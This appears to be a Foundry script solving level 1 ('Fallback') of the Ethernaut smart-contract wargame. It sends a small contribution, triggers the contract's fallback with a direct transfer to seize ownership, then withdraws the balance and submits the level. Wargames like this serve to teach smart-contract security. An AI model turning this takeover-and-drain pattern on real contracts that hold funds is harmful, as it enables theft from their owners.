// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {Fallback} from "../src/Level01.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";

contract Level00 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));

    function run() public {
        Fallback instance = Fallback(payable(vm.envAddress("LVL01_ADDR")));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        instance.contribute{value: 1 wei}();
        (bool success, ) = address(instance).call{value: 1 wei}("");

        if (success) {
            instance.withdraw();
            ethernaut.submitLevelInstance(address(instance));
        }

        vm.stopBroadcast();
    }
}
